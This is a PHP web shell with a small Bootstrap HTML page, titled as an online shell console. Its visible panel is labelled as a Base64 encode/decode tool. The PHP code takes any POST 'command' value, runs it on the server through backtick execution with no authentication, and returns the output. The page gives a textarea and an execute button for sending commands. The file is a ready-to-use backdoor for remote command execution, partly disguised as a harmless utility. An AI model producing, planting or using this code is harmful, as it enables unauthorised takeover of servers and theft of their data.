<?php
ignore_user_abort(true);

if(isset($_POST['command']) && !empty($_POST['command'])) {
	$command = trim($_POST['command']);
	$data = '';
	if($command) {
		$data = `$command`;
	}
	echo json_encode(['data' => $data]);
	exit;
}

?>
<!DOCTYPE html>
<html lang="zh-CN"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
		<meta charset="utf-8">
		<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" name="viewport">
		<title>shell在线控制台</title>
				<!-- Site CSS -->
		<script src="assets/jquery.js"></script>
		<link href="assets/bootstrap.css" rel="stylesheet">
		<script src="assets/bootstrap.js"></script>

		<style>
			.list-group-item a{padding-right:20px}
			#links a{font-size:13px}
			#desc1{font-size: 13px;}
			.newFeatureTip{
				  width: 13px;
				  height: 13px;
				    background-repeat: no-repeat;
				position: absolute;
				  top: 5px;color: red;
				  right: 10px;}
				  
				.newItem{
					  float: left;
					  color: red;
					  position: absolute;
					  margin-top: 2px;
					  margin-left: 8px;
				}
				.announce{
					color:red;
				}
				
				.nav > li:hover .dropdown-menu {display: block;}
		</style>
	</head>

	<body>
		<div class="aw-container-wrap">
			<div class="container">
				<div class="row">
					<div class="aw-content-wrap clearfix">
						<div class=" aw-main-content" style="min-height:700px;max-height:2000px">
							<div style="clear:both"></div>
<div class="panel panel-default">
	<div class="panel-heading">
		<div class="media">
			<div class="media-body">
				<h4 class="media-heading">Base64加密、解密</h4>
				<div id="desc1">Base64加密、解密</div>
			</div>
		</div>

	</div>
	<div class="panel-body">
		<!--内容块开始-->
		<div>
			<textarea id="content" name="RawJson" class="json_input" rows="10" style="width: 100%;" spellcheck="false" placeholder="请输入要执行的SHELL"></textarea>
		</div>
		<div class="btn-group" role="group" aria-label="...">
		  <button type="button" class="btn btn-primary" onclick="exec();">执行</button>
		</div>
		<div style="padding-top: 10px;">
			<textarea id="result" name="RawJson" class="json_input" rows="10" style="width: 100%;" spellcheck="false" placeholder="结果"></textarea>
		</div>
		<!--内容块结束-->
	</div>
	<input id="encode" value="1" type="hidden">
	<div class="panel-footer"></div>
</div>
<script type="text/javascript">
    function exec() {
		var str = jQuery("#content").val();
		if($.trim(str) != '') {
			$.ajax({
				method: 'post',
				url: '',
				dataType: 'json',
				data: {command: str},
				success: function(data) {
					jQuery("#result").text(data.data);
				}
			});
		}
        
    }
</script>
<!-- content ed -->


</div></div></div></div></div>
</body></html>
